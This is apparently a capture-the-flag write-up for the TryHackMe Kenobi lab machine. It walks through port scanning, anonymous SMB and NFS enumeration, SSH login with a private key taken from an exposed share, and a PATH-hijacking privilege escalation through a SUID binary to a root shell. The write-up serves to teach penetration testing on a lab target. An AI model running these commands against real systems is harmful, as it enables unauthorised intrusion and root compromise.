# 🔐 Kenobi CTF Writeup

## Target Information
- Target IP: 10.49.130.90
- Platform: TryHackMe (Kenobi)

---

## 🔍 Enumeration

### Network Scan

nmap -sC -sV -p- 10.49.130.90

### Results:

- 21/tcp → FTP  
- 22/tcp → SSH  
- 80/tcp → HTTP  
- 111/tcp → RPCBind  
- 139/tcp → SMB  
- 445/tcp → SMB  
- 2049/tcp → NFS  

### Analysis:
- SMB and NFS services are the main attack surface  
- Possible misconfiguration in file sharing services  

---

## 📂 SMB Enumeration

### List Shares:

smbclient -L //10.49.130.90 -N

### Findings:
- Anonymous access enabled  
- Shares accessible without authentication  

### Access Share:

smbclient //10.49.130.90/anonymous -N

### Result:
- Retrieved files from SMB share  
- Found useful information for further steps  

---

## 📡 NFS Enumeration

### Check NFS Shares:

showmount -e 10.49.130.90

### Findings:
- /var directory is mountable  

### Mount Share:

sudo mount -t nfs 10.49.130.90:/var /mnt/kenobi

### Result:
- Accessed /var directory locally  
- Found SSH private key in /var/tmp  

---

## 🔐 Initial Access

### SSH Login:

chmod 600 id_rsa  
ssh -i id_rsa kenobi@10.49.130.90  

### Result:
- User access gained  
- Logged in as kenobi  

---

## 🔐 Privilege Escalation

### Check SUID Binaries:

find / -perm -u=s -type f 2>/dev/null

### Finding:
- menu binary running with root privileges  

### Analysis:
- Binary uses system commands without absolute path  
- Vulnerable to PATH hijacking  

### Exploit:

cd /tmp  
echo "/bin/bash" > curl  
chmod +x curl  
export PATH=/tmp:$PATH  
/menu  

### Result:
- Root shell obtained  

---

## 📂 Post Exploitation

### Findings:
- User flag → Retrieved  
- Root flag → Retrieved  

---

## 🧠 Key Takeaways

- Anonymous SMB access exposes sensitive data  
- NFS misconfiguration allows access to system files  
- SSH private keys should not be publicly accessible  
- SUID binaries can lead to privilege escalation  
- PATH hijacking can result in full system compromise  

---

## 🏁 Final Result

- User access: ✅ Achieved  
- Root access: ✅ Achieved  
- Flags captured: ✅ Complete  